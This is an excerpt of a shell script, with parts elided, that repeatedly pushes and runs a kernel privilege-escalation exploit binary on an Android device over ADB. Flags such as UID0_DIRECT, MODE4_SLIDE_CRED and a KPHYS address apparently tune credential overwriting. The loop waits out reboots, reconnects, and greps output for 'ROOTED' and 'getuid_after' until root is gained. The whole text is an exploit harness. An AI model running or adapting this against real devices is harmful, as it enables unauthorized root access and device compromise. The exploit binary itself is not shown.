...
for n in $(seq 1 $MAX); do
  ...
  if [ -n "$UP" ] && [ "$UP" -lt 140 ] 2>/dev/null; then
    S=$((150 - UP)); echo "roll$n: uptime=$UP wait ${S}s" >> $OUT; sleep $S
  fi
  ...
  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "chmod 755 /data/local/tmp/$B; cd /data/local/tmp; nohup sh -c 'timeout 240 env MODE4_ONLY=1 MODE4_SLIDE_CRED=1 MODE4_CRED_INITTASK=1 UID0_DIRECT=1 UID0_PREFER_CHILD=1 KPHYS=0xa8000000 CORE_SEL=7 GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log /data/local/tmp/$B' > /data/local/tmp/$L.txt 2>&1 &" >/dev/null 2>&1
  echo "roll$n: FIRED $L up=$UP" >> $OUT
  sleep 120
  # read result (reconnect if rebooted)
  con || { sleep 60; con || { echo "roll$n: device dropped mid-fire" >> $OUT; continue; }; }
  R=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "grep -a 'punch_landing\|getuid_after\|child /proc status\|LANDED\|post-select\|ROOTED' /data/local/tmp/$L.txt 2>/dev/null | tail -4; cat /data/local/tmp/ROOTED 2>/dev/null; cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
  echo "roll$n RESULT: $R" >> $OUT
  echo "$R" | grep -q "ROOTED" && { echo "roll$n: *** ROOTED ***" >> $OUT; break; }
done
